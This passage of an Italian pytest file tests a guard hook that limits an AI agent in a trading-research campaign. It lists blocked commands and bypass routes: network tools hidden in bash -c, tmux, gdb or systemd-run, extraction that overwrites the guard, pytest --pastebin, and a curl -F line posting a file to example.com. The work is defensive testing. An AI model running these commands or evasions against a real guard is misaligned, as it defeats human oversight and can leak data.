                    "%(describe)", "%(authorname)", "%(authoremail)", "%(taggername)", "%h", "%(subject"):
        assert not g._formato_branch_sicuro(cattivo), cattivo


# problemi 3 e 4: quando il guardiano ha gia' indicato la forma giusta non chiede all'utente
def test_J_storia_limitata_non_chiede_all_utente(limitata: Path):
    codice, errore = _bash(limitata, "git log -- research/campagne/GRUPPO/")
    assert codice == 2
    assert "non serve chiedere" in errore and "chiedi all'utente" not in errore, errore


def test_J_messaggio_di_commit_del_gruppo_non_chiede_all_utente(gruppo: Path):
    codice, errore = _write(gruppo, "research/data/insample/GRUPPO/messaggio.txt")
    assert codice == 2
    assert "research/data/insample/BTCUSDT/" in errore
    assert "non serve chiedere" in errore and "chiedi all'utente" not in errore, errore


def test_J_un_rifiuto_normale_chiede_ancora_all_utente(gruppo: Path):
    """La formula «chiedi all'utente» resta per i rifiuti senza un'alternativa indicata."""
    codice, errore = _read(gruppo, "research/data/insample/ETHUSDT/x.zip")
    assert codice == 2 and "chiedi all'utente" in errore, errore


# ---------------------------------------------------------------------------
# K. seconda revisione del 10 ottobre 2026 (rev1, voci 23 e 26): la rete, gli
#    interpreti con -m, il `=`, research/config, git pull --ff-only, reset e stash.
#    Valgono per ogni campagna (test_guardiano.py, sezione «revisione del 10
#    ottobre 2026»); qui con il marcatore GRUPPO e, dove serve, con una moneta sola.
# ---------------------------------------------------------------------------

_MOTIVO_RETE = ("apre la rete: in campagna i dati si scaricano solo con research/src/dati.py, "
                "le pagine solo con WebFetch")


@pytest.mark.parametrize(
    "comando",
    [
        # i sei comandi della revisione: passavano con il marcatore GRUPPO, in HEAD e nel working tree
        "curl -s 'https://www.binance.com/fapi/v1/exchangeInfo?symbol=OCEANUSDT'",
        "wget -qO- 'https://www.binance.com/fapi/v1/exchangeInfo?a=b'",
        "curl -sI 'https://data.binance.vision/data/futures/um/monthly/klines/OCEANUSDT/1d/"
        "OCEANUSDT-1d-2024-06.zip?a=1'",
        "curl -s -o research/data/insample/OCEANUSDT/x.zip 'https://data.binance.vision/data/futures/um/monthly/"
        "klines/OCEANUSDT/1d/OCEANUSDT-1d-2025-06.zip?a=1'",
        "curl -s -o research/data/insample/BTCUSDT/x.zip 'https://data.binance.vision/data/futures/um/monthly/"
        "klines/BTCUSDT/1d/BTCUSDT-1d-2025-06.zip?a=1'",
        "curl -s 'https://s3-ap-northeast-1.amazonaws.com/data.binance.vision?delimiter=%2F"
        "&prefix=data%2Ffutures%2Fum%2Fmonthly%2Fklines%2F'",
        # e quelli che la verifica ha aggiunto
        "gh issue list",
        "gh api 'repos/o/r/contents/research?ref=research%2Fcampagna%2FBNBUSDT'",
        "httpx 'https://www.binance.com/fapi/v1/exchangeInfo?a=b'",
        "python3 -m pip download -d research/data/insample/BTCUSDT 'https://data.binance.vision/x.zip?a=1'",
        "uvx --from httpie http 'www.binance.com/x?a=b'",
        "nc -z www.binance.com 443",
        "/usr/bin/curl www.binance.com",
        "env wget www.binance.com",
        "timeout 60 curl www.binance.com",
        "nohup wget www.binance.com &",
        "bash -c 'curl www.binance.com'",
        "find research/campagne/GRUPPO -exec curl www.binance.com \\;",
    ],
)
def test_K_rete_rifiutata_nel_gruppo(gruppo: Path, comando: str):
    _rifiutato(_bash(gruppo, comando))


@pytest.mark.parametrize("programma", sorted(g._PROGRAMMI_RETE))
def test_K_ogni_programma_di_rete_rifiutato_nel_gruppo(gruppo: Path, programma: str):
    codice, errore = _bash(gruppo, f"{programma} www.binance.com")
    _rifiutato((codice, errore))
    assert f"{programma} {_MOTIVO_RETE}" in errore, errore


@pytest.mark.parametrize("comando, atteso", [
    ("python3 -m pip list", 2),
    ("python -m http.server", 2),
    ("python3 -mpip install x", 2),
    ("python3 -Ic 'print(1)'", 2),
    ("python -m pytest research/src/tests/test_guardiano.py research/src/tests/test_guardiano_4_4.py "
     "research/src/tests/test_guardiano_gruppo.py -q -p no:cacheprovider", 0),
    ("python -m pytest research/src/tests -q -p no:cacheprovider", 0),
    ("python3 research/campagne/GRUPPO/codice/strategia.py", 0),
    ("PYTHONHASHSEED=0 python3 research/campagne/GRUPPO/codice/strategia.py", 0),
])
def test_K_interpreti_nel_gruppo(gruppo: Path, comando: str, atteso: int):
    codice, errore = _bash(gruppo, comando)
    assert codice == atteso, errore


@pytest.mark.parametrize("comando, atteso", [
    ("cat research/campagne/ETHUSDT/a=b", 2),
    ("cat research/data/insample/ETHUSDT/a=b", 2),
    ("echo 'https://www.binance.com/fapi/v1/exchangeInfo?symbol=OCEANUSDT'", 2),
    ("echo https://arxiv.org/abs/1234.5678 >> research/campagne/GRUPPO/fonti.md", 0),
    ("dd of=research/data/insample/BTCUSDT/x", 0),
    ("dd of=research/data/insample/ETHUSDT/x", 2),
    ("cat research/campagne/GRUPPO/a=b", 0),
])
def test_K_uguale_e_indirizzi_nel_gruppo(gruppo: Path, comando: str, atteso: int):
    codice, errore = _bash(gruppo, comando)
    assert codice == atteso, errore


_FILE_CONFIG = ("research/config/parametri.yaml", "research/config/regole_dimensione.md")
_SCRITTURE_CONFIG = [
    ("Write", lambda p: {"file_path": p, "content": "gruppo: {minimo_trade: 1}\n"}),
    ("Edit", lambda p: {"file_path": p, "old_string": "gruppo", "new_string": "x"}),
    ("MultiEdit", lambda p: {"file_path": p, "edits": [{"old_string": "gruppo", "new_string": "x"}]}),
    ("Bash", lambda p: {"command": f"cp research/campagne/GRUPPO/ipotesi.md {p}"}),
    ("Bash", lambda p: {"command": f"sed -i -e 's|a|b|' {p}"}),
    ("Bash", lambda p: {"command": f"echo x > {p}"}),
    ("Bash", lambda p: {"command": f"echo x >> {p}"}),
    ("Bash", lambda p: {"command": f"echo x | tee {p}"}),
    ("Bash", lambda p: {"command": f"rm {p}"}),
    ("Bash", lambda p: {"command": f"mv {p} research/campagne/GRUPPO/vecchio"}),
    ("Bash", lambda p: {"command": f"mv research/campagne/GRUPPO/ipotesi.md {p}"}),
    ("Bash", lambda p: {"command": f"cd research/config && sed -i 's|a|b|' {p.rsplit('/', 1)[1]}"}),
    ("Bash", lambda p: {"command": f"cd research/config && echo x > {p.rsplit('/', 1)[1]}"}),
]


@pytest.mark.parametrize("percorso", _FILE_CONFIG)
@pytest.mark.parametrize("strumento, ingresso", _SCRITTURE_CONFIG,
                         ids=[f"{s}-{i}" for i, (s, _) in enumerate(_SCRITTURE_CONFIG)])
def test_K_config_in_sola_lettura_nel_gruppo(gruppo: Path, percorso: str, strumento: str, ingresso):
    """`parametri.yaml` ha la sezione `gruppo` con i numeri dell'esame, che la sessione legge:
    con un Edit cambierebbe il proprio esame (rev1, voce 26)."""
    _rifiutato(_esegui(gruppo, strumento, ingresso(percorso)))


@pytest.mark.parametrize("strumento, ingresso", _SCRITTURE_CONFIG,
                         ids=[f"{s}-{i}" for i, (s, _) in enumerate(_SCRITTURE_CONFIG)])
def test_K_config_in_sola_lettura_per_una_moneta(tmp_path_factory, strumento: str, ingresso):
    radice = _radice_gruppo(tmp_path_factory.mktemp("config_sol") / "repo", {"tipo": "campagna", "simbolo": "SOLUSDT"})
    for percorso in _FILE_CONFIG:
        _rifiutato(_esegui(radice, strumento, ingresso(percorso)), "sessione campagna SOLUSDT")
    assert _bash(radice, "rm -rf research/config")[0] == 2
    assert _read(radice, "research/config/parametri.yaml")[0] == 0


@pytest.mark.parametrize("comando", ["rm -rf research/config", "rm -r research/config/", "mv research/config x"])
def test_K_config_cartella_intera_nel_gruppo(gruppo: Path, comando: str):
    _rifiutato(_bash(gruppo, comando))


@pytest.mark.parametrize("percorso", _FILE_CONFIG)
def test_K_config_si_legge_nel_gruppo(gruppo: Path, percorso: str):
    assert _read(gruppo, percorso)[0] == 0
    for comando in (f"cat {percorso}", "ls research/config", "grep -r gruppo research/config"):
        codice, errore = _bash(gruppo, comando)
        assert codice == 0, f"{comando}: {errore}"


def test_K_config_e_protetta_per_ogni_campagna():
    for percorso in _FILE_CONFIG + ("research/config", "research/config/percorsi_vietati.txt",
                                    "research/config/nuovo.yaml"):
        assert g.e_protetto(percorso), percorso
    assert not g.e_protetto("research/configurazione/x")


def test_K_pull_ff_only_del_proprio_branch_ammesso_e_funzionante(completa: Path):
    """Regole.md, sezione 7, punto 2, e il messaggio di apertura: prima della validazione la
    sessione fa `git pull --ff-only origin research/campagna/GRUPPO` e cerca il via libera,
    che il coordinamento ha appena spinto sul branch."""
    coordinamento = completa.parent / "coordinamento"
    assert _git(coordinamento, "branch", "--show-current") == PROPRIO
    _scrivi(coordinamento, "research/campagne/GRUPPO/via_libera_validazione.md", "via libera\n")
    _commit(coordinamento, "coordinamento: via libera alla validazione")
    _git(coordinamento, "push", "-q", "origin", "HEAD")
    for comando in (f"git pull --ff-only origin {PROPRIO}", f"git pull -q --ff-only origin {PROPRIO}"):
        codice, errore = _bash(completa, comando)
        assert codice == 0, f"{comando}: {errore}"
    codice, uscita = _bash_vero_esito(completa, f"git pull --ff-only origin {PROPRIO}")
    assert codice == 0, uscita
    for riservato in RISERVATI:
        assert riservato not in uscita, f"git pull --ff-only stampa {riservato}"
    assert (completa / "research/campagne/GRUPPO/via_libera_validazione.md").read_text() == "via libera\n"


@pytest.mark.parametrize(
    "comando",
    [
        "git pull --ff-only",
        "git pull --ff-only origin",
        "git pull --ff-only origin main",
        "git pull --ff-only origin HEAD",
        "git pull --ff-only origin research/campagna/BTCUSDT",
        "git pull --ff-only origin research/archivio/campagna/GRUPPO",
        "git pull --ff-only origin research/coordinamento",
        "git pull --ff-only origin refs/heads/main",
        "git pull --ff-only origin 'research%2Fcampagna%2FBTCUSDT'",
        f"git pull --ff-only origin {PROPRIO} main",
        f"git pull --ff-only origin {PROPRIO}:main",
        f"git pull --ff-only --all origin {PROPRIO}",
        f"git pull --ff-only ../origine.git {PROPRIO}",
        f"git pull --ff-only https://github.com/o/r {PROPRIO}",
        "git pull",
        "git pull origin main",
        "git fetch",
        "git fetch --all",
        "git fetch origin main",
        "git fetch origin refs/heads/research/campagna/BTCUSDT",
        f"git fetch origin {PROPRIO} main",
        "git fetch --ff-only origin main",
    ],
)
def test_K_pull_e_fetch_di_altri_branch_rifiutati(completa_condivisa: Path, comando: str):
    _rifiutato(_bash(completa_condivisa, comando))


@pytest.mark.parametrize("comando, atteso", [
    ("git reset --hard", 2),
    ("git reset -- research/campagne/GRUPPO/ipotesi.md", 2),
    ("git stash", 2),
    ("git stash list", 2),
    ("git stash list -q", 2),
    ("git reset -q --hard", 0),
    ("git reset --quiet -- research/campagne/GRUPPO/ipotesi.md", 0),
    ("git stash -q", 0),
    ("git stash push -q -m 'prima di provare' -- research/campagne/GRUPPO/", 0),
    ("git stash pop -q", 0),
])
def test_K_reset_e_stash_solo_con_q_nel_gruppo(completa_condivisa: Path, comando: str, atteso: int):
    codice, errore = _bash(completa_condivisa, comando)
    assert codice == atteso, errore
    if atteso == 2 and "list" not in comando:
        assert "aggiungi -q (o --quiet)" in errore and "non serve chiedere all'utente" in errore, errore


def test_K_comandi_della_sessione_di_gruppo_ammessi_e_funzionanti(completa: Path):
    """I comandi che regole.md, lezioni/metodo.md e il messaggio di apertura (research/apertura/
    gruppo.md, branch di coordinamento) suggeriscono: il guardiano li ammette, e git, eseguito
    davvero, li fa senza errori e senza stampare nulla di riservato."""
    _scrivi(completa, "research/campagne/GRUPPO/ipotesi.md", "ipotesi\n")
    _scrivi(completa, "research/campagne/GRUPPO/codice/x.py", "print('ok')\n")
    _scrivi(completa, "research/data/insample/BTCUSDT/messaggio.txt", "campagna di gruppo: ipotesi\n")
    eseguiti = [
        f"git fetch origin {PROPRIO}",
        "git branch --show-current",
        "git status",
        "date -u",
        "python3 research/campagne/GRUPPO/codice/x.py",
        "PYTHONHASHSEED=0 python3 research/campagne/GRUPPO/codice/x.py",
        "git add research/campagne/GRUPPO/ipotesi.md research/campagne/GRUPPO/codice/x.py",
        "git diff HEAD -- research/campagne/GRUPPO/",
        "git diff --cached -- research/campagne/GRUPPO/",
        "git commit -F research/data/insample/BTCUSDT/messaggio.txt",
        f"git push -u origin {PROPRIO}",
        f"git pull origin {PROPRIO}",
        f"git pull --ff-only origin {PROPRIO}",
        "git log --format='%h %cI' -- research/campagne/GRUPPO/",
        f"git log --reverse --format=%cI origin/{PROPRIO} -- research/campagne/GRUPPO/log.jsonl",
        "git log -- research/campagne/GRUPPO/",
        "git diff",
    ]
    for comando in eseguiti:
        codice, errore = _bash(completa, comando)
        assert codice == 0, f"{comando}: {errore}"
        codice, uscita = _bash_vero_esito(completa, comando)
        assert codice == 0, f"{comando}: {uscita}"
        for riservato in RISERVATI:
            assert riservato not in uscita, f"{comando!r} stampa {riservato}"
    # questi solo giudicati: `dd` aspetterebbe stdin, pytest qui non ha i test
    for comando in ("dd of=research/data/insample/BTCUSDT/x",
                    "python -m pytest research/src/tests -q -p no:cacheprovider",
                    "python -m pytest research/src/tests/test_guardiano.py research/src/tests/test_guardiano_4_4.py "
                    "research/src/tests/test_guardiano_gruppo.py -q -p no:cacheprovider"):
        codice, errore = _bash(completa, comando)
        assert codice == 0, f"{comando}: {errore}"


def test_K_nella_storia_limitata_il_log_con_date_e_hash_resta_ammesso(limitata: Path):
    comando = "git log --format='%h %cI' -- research/campagne/GRUPPO/"
    assert _bash(limitata, comando)[0] == 0
    codice, uscita = _bash_vero_esito(limitata, comando)
    assert codice == 0 and not any(r in uscita for r in RISERVATI), uscita


# ---------------------------------------------------------------------------
# L. revisione avversaria del 10 ottobre 2026 (rev1): patch/tar, pytest --pastebin,
#    le versioni con il trattino, `-m` del repo, il valore di -o/-O, l'indirizzo
#    scritto, i valori delle opzioni di uniq/xxd, altri lanciatori. Valgono per
#    ogni campagna (test_guardiano.py); qui con il marcatore GRUPPO e con SOLUSDT.
# ---------------------------------------------------------------------------


def _radice_sol(tmp_path_factory) -> Path:
    return _radice_gruppo(tmp_path_factory.mktemp("sol") / "repo", {"tipo": "campagna", "simbolo": "SOLUSDT"})


# P1: patch/tar scrivono su un bersaglio nominato solo nei dati di ingresso. I bersagli
# piu' pericolosi sono proprio i file protetti: il guardiano, il marcatore, la config.
@pytest.mark.parametrize(
    "comando",
    [
        "patch -p1 < research/campagne/GRUPPO/codice/evil.diff",   # header: research/src/guardiano.py
        "tar xf research/campagne/GRUPPO/codice/s.tar",            # contiene research/.sessione
        "tar xf research/campagne/GRUPPO/codice/c.tar",            # contiene research/config/parametri.yaml
        "cpio -idv",
        "unzip research/campagne/GRUPPO/codice/s.zip",
        "bsdtar xf research/campagne/GRUPPO/codice/s.tar",
        "pax -r -f research/campagne/GRUPPO/codice/s.tar",
        "nohup tar xf research/campagne/GRUPPO/codice/s.tar",
        "sh -c 'patch -p1 < research/campagne/GRUPPO/codice/evil.diff'",
    ],
)
def test_L_estrazione_vietata_nel_gruppo(gruppo: Path, comando: str):
    codice, errore = _bash(gruppo, comando)
    _rifiutato((codice, errore))
    assert "dati di ingresso" in errore, errore


def test_L_estrazione_vietata_per_una_moneta(tmp_path_factory):
    radice = _radice_sol(tmp_path_factory)
    for comando in ("patch -p1 < research/campagne/SOLUSDT/codice/e.diff",
                    "tar xf research/campagne/SOLUSDT/codice/s.tar"):
        _rifiutato(_bash(radice, comando), "sessione campagna SOLUSDT")
    # i file protetti restano sul disco: il guardiano ha rifiutato prima di eseguire
    assert "segnaposto" in (radice / "research/src/guardiano.py").read_text()
    assert (radice / "research/.sessione").read_text().strip()


# P2: pytest --pastebin invia il report a bpaste.net
@pytest.mark.parametrize("comando, atteso", [
    ("python3 -m pytest --pastebin=all", 2),
    ("python -m pytest --pastebin all research/src/tests", 2),
    ("python -m pytest research/src/tests -q -p no:cacheprovider", 0),
    ("python -m pytest research/src/tests -k pastebin", 0),
])
def test_L_pytest_pastebin_nel_gruppo(gruppo: Path, comando: str, atteso: int):
    codice, errore = _bash(gruppo, comando)
    assert codice == atteso, errore
    if atteso == 2:
        assert "bpaste.net" in errore, errore


# P3: le versioni con il trattino dei programmi di rete
@pytest.mark.parametrize("programma", ["pip-3.12", "pip3-3.12", "uv-0.5", "uvx-0.5"])
def test_L_rete_versione_con_trattino_nel_gruppo(gruppo: Path, programma: str):
    codice, errore = _bash(gruppo, f"{programma} install requests")
    _rifiutato((codice, errore))
    assert _MOTIVO_RETE in errore, errore


# P4: `python -m research.campagne.<propria>...` e `research.src...`: rifiuto autonomo
@pytest.mark.parametrize("simbolo", ["GRUPPO", "SOLUSDT"])
def test_L_m_modulo_del_repo_rifiutato_ma_autonomo(tmp_path_factory, simbolo):
    radice = _radice_gruppo(tmp_path_factory.mktemp(f"m_{simbolo}") / "repo",
                            {"tipo": "campagna", "simbolo": simbolo})
    etichetta = f"sessione campagna {simbolo}"
    for comando in (f"python -m research.campagne.{simbolo}.codice.x",
                    "python3 -m research.src.dati"):
        codice, errore = _bash(radice, comando)
        assert codice == 2, errore
        assert etichetta in errore, errore
        assert "lancia lo script per percorso" in errore, errore
        assert f"research/campagne/{simbolo}/codice" in errore, errore
        assert "non serve chiedere all'utente" in errore, errore
        assert "Registra il rifiuto nel log" not in errore, errore


# P5: il valore di -o/-O (e di --rcfile/--init-file) non e' il comando di -c
@pytest.mark.parametrize(
    "comando",
    [
        "bash -oc pipefail 'curl www.binance.com'",
        "bash -euoc pipefail 'wget www.binance.com'",
        "sh -oc pipefail 'curl www.binance.com'",
        "bash -Oc extglob 'gh issue list'",
        "bash -oc pipefail 'cd docs && head -c 60 state.md'",
        "bash --init-file research/campagne/GRUPPO/ipotesi.md -c 'cd docs && head -c 60 state.md'",
    ],
)
def test_L_opzioni_shell_non_nascondono_il_comando(gruppo: Path, comando: str):
    _rifiutato(_bash(gruppo, comando))


@pytest.mark.parametrize(
    "comando",
    [
        "bash -oc pipefail 'cat research/campagne/GRUPPO/ipotesi.md'",
        "bash -euoc pipefail 'python3 research/campagne/GRUPPO/codice/strategia.py'",
    ],
)
def test_L_opzioni_shell_comando_interno_lecito_passa(gruppo: Path, comando: str):
    codice, errore = _bash(gruppo, comando)
    assert codice == 0, errore


# P6: un indirizzo usato come operando da un programma che scrive e' anche un percorso
@pytest.mark.parametrize(
    "comando",
    [
        "mkdir -p https://arxiv.org/abs",
        "cp research/campagne/GRUPPO/ipotesi.md https://arxiv.org/abs/x",
        "git add https://arxiv.org/abs/x",
        "touch https://arxiv.org/x",
    ],
)
def test_L_indirizzo_scritto_si_giudica_come_percorso(gruppo: Path, comando: str):
    _rifiutato(_bash(gruppo, comando))


@pytest.mark.parametrize("comando, atteso", [
    ("echo https://arxiv.org/abs/1234.5678 >> research/campagne/GRUPPO/fonti.md", 0),
    ("echo x > https://arxiv.org/x", 2),
])
def test_L_indirizzo_stampato_o_rediretto_nel_gruppo(gruppo: Path, comando: str, atteso: int):
    codice, errore = _bash(gruppo, comando)
    assert codice == atteso, errore


# P7: i valori delle opzioni di uniq e xxd non sono operandi (non sono scritture)
@pytest.mark.parametrize(
    "comando",
    [
        "xxd -s 16 research/config/parametri.yaml",
        "xxd -l 64 research/config/parametri.yaml",
        "uniq -f 1 research/config/parametri.yaml",
        "uniq -w 3 research/campagne/GRUPPO/monete.csv",
        "uniq --check-chars 3 research/config/parametri.yaml",
    ],
)
def test_L_uniq_xxd_lettura_con_opzioni_valore(gruppo: Path, comando: str):
    codice, errore = _bash(gruppo, comando)
    assert codice == 0, errore


@pytest.mark.parametrize(
    "comando",
    [
        "uniq research/campagne/GRUPPO/log.jsonl research/config/parametri.yaml",
        "xxd research/campagne/GRUPPO/log.jsonl research/config/parametri.yaml",
        "xxd -s 1 research/campagne/GRUPPO/log.jsonl research/config/parametri.yaml",
    ],
)
def test_L_uniq_xxd_in_out_resta_scrittura(gruppo: Path, comando: str):
    _rifiutato(_bash(gruppo, comando))


# P8: altri lanciatori
@pytest.mark.parametrize(
    "comando",
    [
        "su -c 'gh issue list'",
        "runuser -u root -- bash -c 'cd docs && head -c 30 state.md'",
        "systemd-run --pipe curl www.binance.com",
        "tmux new-session -d 'curl www.binance.com'",
        "screen -dm curl www.binance.com",
        "gdb -batch -ex 'shell curl www.binance.com'",
        "make -f research/campagne/GRUPPO/codice/Makefile",
    ],
)
def test_L_lanciatori_vietati_nel_gruppo(gruppo: Path, comando: str):
    _rifiutato(_bash(gruppo, comando))


# ---------------------------------------------------------------------------
# M. terzo giro di revisione del 10 ottobre 2026: l'uscita dei calcoli lunghi. Lo
#    strumento salva l'uscita di un comando in background (o passato in background
#    allo scadere del tempo) in /tmp/claude-.../tasks/<id>.output, e un'uscita troppo
#    lunga in ~/.claude/projects/.../tool-results/: fuori dai percorsi ammessi, come
#    Monitor. Restano rifiuti, ma con il marcatore GRUPPO il messaggio indica i file
#    della redirezione (regole.md, sezione 12, punto 6) invece di chiedere all'utente;
#    con una moneta sola il messaggio non cambia. La redirezione e' ammessa.
# ---------------------------------------------------------------------------

_TASKS = "/tmp/claude-0/-home-user-agentic-trading-system/5f3c9e2a-0000-4000-8000-000000000000/tasks/b6gruv0cf.output"
_TOOL_RESULTS = "/root/.claude/projects/-home-user-agentic-trading-system/5f3c9e2a/tool-results/toolu_01.txt"
_USCITE_DELLO_STRUMENTO = [
    ("Read", {"file_path": _TASKS}),
    ("Read", {"file_path": _TASKS, "offset": 10, "limit": 50}),
    ("Bash", {"command": f"cat {_TASKS}"}),
    ("Bash", {"command": f"tail -n 40 {_TASKS}"}),
    ("Read", {"file_path": _TOOL_RESULTS}),
    ("Bash", {"command": f"head -c 2000 {_TOOL_RESULTS}"}),
    ("Monitor", {"command": f"tail -f {_TASKS}", "description": "aspetta"}),
    ("Monitor", {}),
]
_LAVORO = "research/campagne/GRUPPO/lavoro"
_FORMA_REDIREZIONE = (f"python3 -u research/campagne/GRUPPO/codice/x.py > {_LAVORO}/x.out "
                      f"2> {_LAVORO}/x.err")


@pytest.mark.parametrize("strumento, ingresso", _USCITE_DELLO_STRUMENTO)
def test_M_uscita_dello_strumento_rifiutata_ma_autonoma_nel_gruppo(gruppo: Path, strumento: str, ingresso):
    codice, errore = _esegui(gruppo, strumento, ingresso)
    _rifiutato((codice, errore))
    assert f"{_LAVORO}/<nome>.out e .err" in errore, errore
    assert "regole.md, sezione 12, punto 6" in errore, errore
    assert f"> {_LAVORO}/<nome>.out 2> {_LAVORO}/<nome>.err" in errore and "python3 -u" in errore, errore
    assert "non serve chiedere all'utente" in errore, errore
    assert "chiedi all'utente" not in errore and "Registra il rifiuto nel log" not in errore, errore
    assert errore.count("\n") <= 1, errore  # una riga sola


@pytest.mark.parametrize("strumento, ingresso", _USCITE_DELLO_STRUMENTO)
def test_M_uscita_dello_strumento_con_una_moneta_sola_messaggio_di_prima(tmp_path_factory, strumento: str, ingresso):
    radice = _radice_sol(tmp_path_factory)
    codice, errore = _esegui(radice, strumento, ingresso)
    _rifiutato((codice, errore), "sessione campagna SOLUSDT")
    assert "lavoro/<nome>.out" not in errore and "Monitor." not in errore, errore
    assert errore.rstrip("\n").endswith(" e' fuori dai percorsi ammessi dal protocollo (Passo 3). Registra il "
                                        "rifiuto nel log e chiedi all'utente."), errore


def test_M_messaggio_con_una_moneta_sola_identico_a_quello_di_prima():
    """Il messaggio di una moneta sola, costruito qui con il formato di prima, e quello del guardiano coincidono."""
    ctx = g.Contesto(radice="/r", tipo="campagna", simbolo="SOLUSDT")
    for oggetto in (_TASKS, f"'cat {_TASKS}' (percorso {_TASKS})", _TOOL_RESULTS,
                    "lo strumento Monitor (non e' fra quelli ammessi in campagna: puo' leggere altri branch, "
                    "la storia o le sessioni precedenti)"):
        assert g.messaggio_rifiuto(ctx, oggetto) == (
            f"[guardiano] azione rifiutata (sessione campagna SOLUSDT): {oggetto} e' fuori dai percorsi ammessi "
            "dal protocollo (Passo 3). Registra il rifiuto nel log e chiedi all'utente.")


@pytest.mark.parametrize("oggetto, atteso", [
    (_TASKS, True),
    (f"'tail -5 {_TASKS}' (percorso {_TASKS})", True),
    ("/tmp/claude-1000/x/tasks/y.output", True),
    (_TOOL_RESULTS, True),
    ("/home/u/.claude/projects/p/s/tool-results/t.txt", True),
    ("lo strumento Monitor (non e' fra quelli ammessi in campagna: ...)", True),
    ("/tmp/altro/tasks/y.output", False),             # non e' la cartella dello strumento
    ("/tmp/claude-0/x/y.output", False),
    ("research/campagne/GRUPPO/tasks/x.md", False),
    ("/root/.claude/projects/p/s/x.jsonl", False),     # la storia delle sessioni: resta un rifiuto normale
    ("lo strumento Monitored (non e' fra quelli ammessi)", False),
    ("research/data/insample/ETHUSDT/x.zip", False),
])
def test_M_quali_rifiuti_indicano_la_redirezione(oggetto: str, atteso: bool):
    assert g._uscita_dello_strumento(oggetto) is atteso


def test_M_un_altro_rifiuto_nel_gruppo_chiede_ancora_all_utente(gruppo: Path):
    for esito in (_read(gruppo, "/root/.claude/projects/p/s/x.jsonl"), _read(gruppo, "/tmp/altro/x.output"),
                  _bash(gruppo, "python3 research/campagne/GRUPPO/codice/x.py 2>&1")):
        _rifiutato(esito)
        assert "chiedi all'utente" in esito[1] and "lavoro/<nome>.out" not in esito[1], esito[1]


@pytest.mark.parametrize("comando", [
    _FORMA_REDIREZIONE,
    f"python3 research/campagne/GRUPPO/codice/x.py > {_LAVORO}/x.out 2> {_LAVORO}/x.err",
    f"python3 -u research/campagne/GRUPPO/codice/x.py >> {_LAVORO}/x.out 2>> {_LAVORO}/x.err",
    f"cat {_LAVORO}/x.out",
    f"tail -n 50 {_LAVORO}/x.err",
    f"wc -l {_LAVORO}/x.out {_LAVORO}/x.err",
])
def test_M_la_redirezione_nella_cartella_del_gruppo_e_ammessa(gruppo: Path, comando: str):
    codice, errore = _bash(gruppo, comando)
    assert codice == 0, errore


@pytest.mark.parametrize("comando", [
    "python3 -u research/campagne/GRUPPO/codice/x.py > /tmp/x.out 2> /tmp/x.err",
    f"python3 -u research/campagne/GRUPPO/codice/x.py > research/campagne/AAVEUSDT/x.out 2> {_LAVORO}/x.err",
    "python3 -u research/campagne/GRUPPO/codice/x.py > research/data/vault/x.out",
    f"python3 -u research/campagne/GRUPPO/codice/x.py > {_LAVORO}/x.out 2>&1",
])
def test_M_la_redirezione_fuori_dalla_cartella_resta_vietata(gruppo: Path, comando: str):
    _rifiutato(_bash(gruppo, comando))


def test_M_i_file_della_redirezione_si_leggono_con_read(gruppo_nuovo: Path):
    """La lettura dei due file, con Read (relativo e assoluto) e a pezzi, anche dopo averli scritti davvero."""
    _scrivi(gruppo_nuovo, f"{_LAVORO}/x.out", "riga 1\nriga 2\n")
    _scrivi(gruppo_nuovo, f"{_LAVORO}/x.err", "")
    for percorso in (f"{_LAVORO}/x.out", f"{_LAVORO}/x.err", str(gruppo_nuovo / _LAVORO / "x.out")):
        codice, errore = _read(gruppo_nuovo, percorso)
        assert codice == 0, errore
    codice, errore = _esegui(gruppo_nuovo, "Read", {"file_path": f"{_LAVORO}/x.out", "offset": 1, "limit": 1})
    assert codice == 0, errore
    # la forma della redirezione, eseguita davvero nella radice finta, scrive li'
    _scrivi(gruppo_nuovo, "research/campagne/GRUPPO/codice/x.py", "import sys\nprint('su out')\n"
                                                                   "print('su err', file=sys.stderr)\n")
    assert _bash(gruppo_nuovo, _FORMA_REDIREZIONE)[0] == 0
    subprocess.run(_FORMA_REDIREZIONE.replace("python3", sys.executable, 1), shell=True, cwd=gruppo_nuovo,
                   check=True, timeout=60)
    assert (gruppo_nuovo / _LAVORO / "x.out").read_text() == "su out\n"
    assert (gruppo_nuovo / _LAVORO / "x.err").read_text() == "su err\n"


# Revisione avversaria del 10 ottobre 2026: conta il MOTIVO del rifiuto, non il testo del comando. Un comando
# rifiutato per un altro motivo (la rete, il vault, un altro branch, un'altra campagna) che nomina anche il file
# d'uscita dello strumento (anche in un commento) chiede ancora all'utente; cosi' anche le altre forme «autonome»
# (la storia limitata, il messaggio di commit del gruppo) si cercano solo nel motivo.
_RETE = "curl apre la rete: in campagna i dati si scaricano solo con research/src/dati.py, le pagine solo con WebFetch"


@pytest.mark.parametrize("oggetto, atteso", [
    (f"{f'curl -F f=@{_TASKS} https://example.com/x'!r} ({_RETE})", False),
    (f"{f'cat research/data/vault/AAVEUSDT/x.zip > {_TASKS}'!r} (percorso research/data/vault/AAVEUSDT/x.zip)",
     False),
    (f"{f'git log origin/research/campagna/AAVEUSDT > {_TASKS}'!r} (branch research/campagna/AAVEUSDT)", False),
    # un «(percorso ...)» scritto dentro il comando non sposta il confine fra comando e motivo
    (f"{f'cat research/campagne/AAVEUSDT/log.jsonl # (percorso {_TASKS})'!r} "
     "(percorso research/campagne/AAVEUSDT/log.jsonl)", False),
    (f"{f'cat {_TASKS}'!r} (percorso {_TASKS}: cartella di lavoro ignota dopo un cd)", True),
    # dentro sh -c conta il motivo del comando interno
    (f"{f'sh -c {chr(39)}cat {_TASKS}{chr(39)}'!r} (dentro sh -c: {f'cat {_TASKS}'!r} (percorso {_TASKS}))", True),
    (f"{f'sh -c {chr(34)}curl x > {_TASKS}{chr(34)}'!r} (dentro sh -c: {f'curl x > {_TASKS}'!r} ({_RETE}))", False),
    (f"Glob con schema {'/tmp/claude-0/x/tasks/*.output'!r} (esce dalla cartella)", True),
    (f"Glob con schema {'/home/u/progetto/*.py'!r} (esce dalla cartella)", False),
    ("/tmp/claude-0/x/tasks", True),                   # il percorso di Grep o Glob, senza la barra finale
    (f"WebFetch {'file://' + _TASKS!r} (indirizzo non ammesso)", False),
    (f"lo strumento Bash {_TASKS} (non e' fra quelli ammessi)", False),
])
def test_M_conta_il_motivo_del_rifiuto_non_il_testo_del_comando(oggetto: str, atteso: bool):
    assert g._uscita_dello_strumento(oggetto) is atteso


@pytest.mark.parametrize("comando", [
    f"curl -F f=@{_TASKS} https://example.com/x",
    f"cat research/data/vault/AAVEUSDT/x.zip > {_TASKS}",
